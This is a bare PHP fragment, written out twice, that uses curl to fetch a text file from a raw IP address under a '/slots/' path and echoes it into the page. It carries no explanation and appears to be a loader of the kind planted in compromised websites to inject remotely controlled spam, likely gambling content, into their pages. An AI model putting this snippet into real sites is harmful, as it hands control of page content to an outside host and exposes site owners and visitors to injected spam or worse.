<?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://156.67.221.29/slots/beloved.txt'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a; ?>


$curl = curl_init();
$url = 'http://156.67.221.29/slots/beloved.txt';
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($curl);
echo $result;
